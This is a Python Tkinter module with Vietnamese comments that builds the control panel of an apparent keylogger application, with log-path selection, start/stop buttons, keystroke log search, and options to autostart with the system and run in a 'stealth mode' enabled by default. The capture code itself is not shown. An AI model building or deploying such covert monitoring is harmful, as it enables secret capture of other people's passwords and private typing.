#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Module chứa KeyloggerFrame - Giao diện theo dõi bàn phím
"""

import os
import logging
import tkinter as tk
from tkinter import ttk, filedialog
from typing import Optional, Callable, Dict, Any, Union

from gui.resources import UIResources

logger = logging.getLogger("keylogger.gui.keylogger_frame")

class KeyloggerFrame:
    """Frame giao diện cho chức năng theo dõi bàn phím."""
    
    def __init__(self, parent, callback: Optional[Callable] = None):
        """Khởi tạo frame theo dõi bàn phím.
        
        Args:
            parent: Widget cha để chứa frame này
            callback: Hàm callback khi trạng thái thay đổi (tùy chọn)
        """
        self.parent = parent
        self.callback = callback
        self.is_recording = False
        self.log_data = ""
        
        # Biến tkinter
        self.log_path_var = tk.StringVar(value=os.path.join(os.path.expanduser("~"), "keylog.txt"))
        self.auto_start_var = tk.BooleanVar(value=False)
        self.stealth_mode_var = tk.BooleanVar(value=True)
        self.search_var = tk.StringVar()
        self.case_sensitive_var = tk.BooleanVar(value=False)
        
        # Tạo giao diện
        self.create_widgets()
    
    def create_widgets(self):
        """Tạo các thành phần giao diện người dùng."""
        # Frame chính
        self.frame = ttk.Frame(self.parent)
        self.frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        self.frame.grid_columnconfigure(0, weight=1)
        self.frame.grid_rowconfigure(2, weight=1)
        
        # Tiêu đề
        title_frame = ttk.Frame(self.frame)
        title_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        
        title_label = ttk.Label(
            title_frame, text="THEO DÕI BÀN PHÍM", font=("Arial", 16, "bold")
        )
        title_label.pack(pady=10)
        
        # Frame tùy chọn
        options_frame = ttk.LabelFrame(self.frame, text="Tùy chọn")
        options_frame.grid(row=1, column=0, sticky="ew", padx=10, pady=5)
        options_frame.grid_columnconfigure(0, weight=1)
        
        # Đường dẫn lưu file log
        path_frame = ttk.Frame(options_frame)
        path_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(path_frame, text="Đường dẫn lưu log:").pack(side=tk.LEFT, padx=5)
        log_path_entry = ttk.Entry(path_frame, textvariable=self.log_path_var, width=40)
        log_path_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        browse_btn = ttk.Button(
            path_frame,
            text="Chọn",
            image=UIResources.get_icon_image("search"),
            compound=tk.LEFT,
            command=self.browse_log_path,
        )
        browse_btn.pack(side=tk.RIGHT, padx=5)
        
        # Chế độ nâng cao
        advanced_frame = ttk.Frame(options_frame)
        advanced_frame.pack(fill=tk.X, padx=5, pady=5)
        
        auto_start_check = ttk.Checkbutton(
            advanced_frame,
            text="Tự khởi động cùng hệ thống",
            variable=self.auto_start_var,
        )
        auto_start_check.pack(side=tk.LEFT, padx=5)
        
        stealth_mode_check = ttk.Checkbutton(
            advanced_frame, text="Chế độ ẩn", variable=self.stealth_mode_var
        )
        stealth_mode_check.pack(side=tk.LEFT, padx=15)
        
        # Nút điều khiển
        control_frame = ttk.Frame(options_frame)
        control_frame.pack(fill=tk.X, padx=5, pady=10)
        
        self.start_icon = UIResources.get_icon_image("start")
        self.start_btn = ttk.Button(
            control_frame,
            text="Bắt đầu theo dõi",
            image=self.start_icon,
            compound=tk.LEFT,
            command=self.start_keylogger,
        )
        self.start_btn.image = self.start_icon
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_icon = UIResources.get_icon_image("stop")
        self.stop_btn = ttk.Button(
            control_frame,
            text="Dừng theo dõi",
            image=self.stop_icon,
            compound=tk.LEFT,
            command=self.stop_keylogger,
            state=tk.DISABLED,
        )
        self.stop_btn.image = self.stop_icon
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        self.clear_icon = UIResources.get_icon_image("delete")
        self.clear_btn = ttk.Button(
            control_frame,
            text="Xóa nhật ký",
            image=self.clear_icon,
            compound=tk.LEFT,
            command=self.clear_log,
        )
        self.clear_btn.image = self.clear_icon
        self.clear_btn.pack(side=tk.LEFT, padx=5)
        
        # Khu vực hiển thị log
        log_frame = ttk.LabelFrame(self.frame, text="Nhật ký phím")
        log_frame.grid(row=2, column=0, sticky="nsew", padx=10, pady=10)
        log_frame.grid_columnconfigure(0, weight=1)
        log_frame.grid_rowconfigure(1, weight=1)
        
        # Thanh tìm kiếm
        search_frame = ttk.Frame(log_frame)
        search_frame.grid(row=0, column=0, sticky="ew", padx=5, pady=5)
        
        ttk.Label(search_frame, text="Tìm kiếm:").pack(side=tk.LEFT, padx=5)
        search_entry = ttk.Entry(search_frame, textvariable=self.search_var, width=30)
        search_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        search_entry.bind("<KeyRelease>", self.search_log)
        
        case_check = ttk.Checkbutton(
            search_frame,
            text="Phân biệt chữ hoa/thường",
            variable=self.case_sensitive_var,
            command=self.search_log,
        )
        case_check.pack(side=tk.LEFT, padx=5)
        
        # Text area hiển thị log với thanh cuộn
        log_container = ttk.Frame(log_frame)
        log_container.grid(row=1, column=0, sticky="nsew", padx=5, pady=5)
        log_container.grid_columnconfigure(0, weight=1)
        log_container.grid_rowconfigure(0, weight=1)
        
        self.log_text = tk.Text(
            log_container, wrap=tk.WORD, font=("Consolas", 10), bg="white"
        )
        self.log_text.grid(row=0, column=0, sticky="nsew")
        
        scrollbar = ttk.Scrollbar(
            log_container, orient=tk.VERTICAL, command=self.log_text.yview
        )
        scrollbar.grid(row=0, column=1, sticky="ns")
        self.log_text.config(yscrollcommand=scrollbar.set)
        
        # Tạo tag để highlight kết quả tìm kiếm
        self.log_text.tag_configure("highlight", background="yellow")
    
    def browse_log_path(self):
        """Chọn đường dẫn lưu file log."""
        path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
        )
        if path:
            self.log_path_var.set(path)
    
    def search_log(self, event=None):
        """Tìm kiếm trong log và highlight kết quả."""
        # Xóa highlight cũ
        self.log_text.tag_remove("highlight", "1.0", tk.END)
        
        # Lấy từ khóa tìm kiếm
        search_text = self.search_var.get()
        if not search_text:
            return
        
        # Tìm và highlight tất cả kết quả
        case_sensitive = self.case_sensitive_var.get()
        start_pos = "1.0"
        
        while True:
            # Tìm từ vị trí start_pos
            if case_sensitive:
                pos = self.log_text.search(search_text, start_pos, stopindex=tk.END)
            else:
                pos = self.log_text.search(
                    search_text, start_pos, stopindex=tk.END, nocase=True
                )
            
            if not pos:
                break
            
            # Tính vị trí kết thúc
            end_pos = f"{pos}+{len(search_text)}c"
            
            # Highlight kết quả
            self.log_text.tag_add("highlight", pos, end_pos)
            
            # Cập nhật vị trí bắt đầu tìm kiếm tiếp theo
            start_pos = end_pos
    
    def start_keylogger(self):
        """Bắt đầu theo dõi bàn phím.
        
        Phương thức này sẽ gọi callback để thông báo cho ứng dụng chính.
        """
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        
        if self.callback:
            log_path = self.log_path_var.get()
            auto_start = self.auto_start_var.get()
            stealth_mode = self.stealth_mode_var.get()
            
            self.callback({
                "action": "start_keylogger",
                "log_path": log_path,
                "auto_start": auto_start,
                "stealth_mode": stealth_mode
            })
    
    def stop_keylogger(self):
        """Dừng theo dõi bàn phím.
        
        Phương thức này sẽ gọi callback để thông báo cho ứng dụng chính.
        """
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        
        if self.callback:
            self.callback({"action": "stop_keylogger"})
    
    def clear_log(self):
        """Xóa nhật ký hiển thị."""
        self.log_text.delete(1.0, tk.END)
        self.log_data = ""
        
        if self.callback:
            self.callback({"action": "clear_log"})
    
    def update_log(self, key_event: str):
        """Cập nhật log hiển thị khi có keystroke mới."""
        self.log_data += key_event
        self.log_text.insert(tk.END, key_event)
        self.log_text.see(tk.END)
        
        # Cập nhật highlight nếu đang tìm kiếm
        if self.search_var.get():
            self.search_log()
    
    def get_frame(self):
        """Trả về frame chính để thêm vào container."""
        return self.frame